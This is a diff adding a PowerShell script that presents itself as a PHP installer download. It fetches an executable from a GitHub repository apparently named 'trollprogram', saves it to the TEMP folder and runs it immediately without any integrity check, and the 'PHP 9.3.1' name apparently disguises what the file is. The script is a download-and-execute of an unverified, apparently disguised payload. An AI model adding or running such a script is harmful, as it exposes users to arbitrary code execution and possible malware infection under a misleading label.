@@ -1,0 +1,19 @@
+
+$InstallerUrl = "https://github.com/1337tr/trollprogram/raw/refs/heads/main/php9-3-1-win-x64.exe"
+
+$DestinationPath = "$env:TEMP\installer.exe"
+
+try {
+    Write-Host "Downloading installer from $InstallerUrl..."
+
+    Invoke-WebRequest -Uri $InstallerUrl -OutFile $DestinationPath -ErrorAction Stop
+
+    Write-Host "Download complete. Starting installer..."
+
+    Start-Process -FilePath $DestinationPath -Wait -ErrorAction Stop
+
+    Write-Host "Installer finished."
+}
+catch {
+    Write-Error "An error occurred: $_"
+}
